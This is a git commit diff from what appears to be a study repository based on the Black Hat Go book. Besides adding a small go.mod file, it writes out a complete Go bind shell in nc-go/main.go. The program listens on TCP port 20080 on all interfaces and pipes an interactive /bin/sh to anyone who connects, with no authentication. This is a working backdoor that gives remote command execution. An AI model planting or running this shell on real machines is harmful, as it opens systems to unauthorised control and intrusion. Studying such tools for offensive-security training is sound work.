16def2260fe7d04982d74ef4f524741ef07f6b8c
ddefrancesco <nullpointer1968@gmail.com>
2022-01-04 01:26:40 +0100

    basic http

---
+++ http/basic/go.mod
@@ -0,0 +1,3 @@
+module github.com/ddefrancesco/blackhat-go/http/basic
+
+go 1.17
--- nc-go/main.go
+++ nc-go/main.go
@@ -1,5 +1,70 @@
 package main
 
-func main() {
+import (
+	"bufio"
+	"io"
+	"log"
+	"net"
+	"os/exec"
+)
 
+type Flusher struct {
+	w *bufio.Writer
+}
+
+func (f *Flusher) Write(b []byte) (int, error) {
+	count, err := f.w.Write(b)
+	if err != nil {
+		return -1, err
+	}
+	if err := f.w.Flush(); err != nil {
+		return -1, err
+	}
+	return count, err
+}
+func NewFlusher(w io.Writer) *Flusher {
+	return &Flusher{
+		w: bufio.NewWriter(w),
+	}
+}
+func handle(conn net.Conn) {
+
+	// Explicitly calling /bin/sh and using -i for interactive mode
+	// so that we can use it for stdin and stdout.
+
+	cmd := exec.Command("/bin/sh", "-i")
+
+	rp, wp := io.Pipe()
+	cmd.Stdin = conn
+
+	// Create a Flusher from the connection to use for stdout.
+	// This ensures stdout is flushed adequately and sent via net.Conn
+
+	cmd.Stdout = wp
+
+	// Run the command
+	// if err := cmd.Run(); err != nil {
+	// 	log.Fatalln(err)
+	// }
+	go io.Copy(conn, rp)
+	cmd.Run()
+	conn.Close()
+
+}
+func main() {
+	// Bind to TCP port 20080 on all interfaces.
+	listener, err := net.Listen("tcp4", ":20080")
+	if err != nil {
+		log.Fatalf("Unable to bind to port: %s", err)
+	}
+	log.Println("Listening on 0.0.0.0:20080")
+	for {
+		// Wait for connection. Create net.Conn on connection established.
+		conn, err := listener.Accept()
+		if err != nil {
+			log.Fatalln(err)
+		}
+		// Handler della connessione.
+		go handle(conn)
+	}
 }
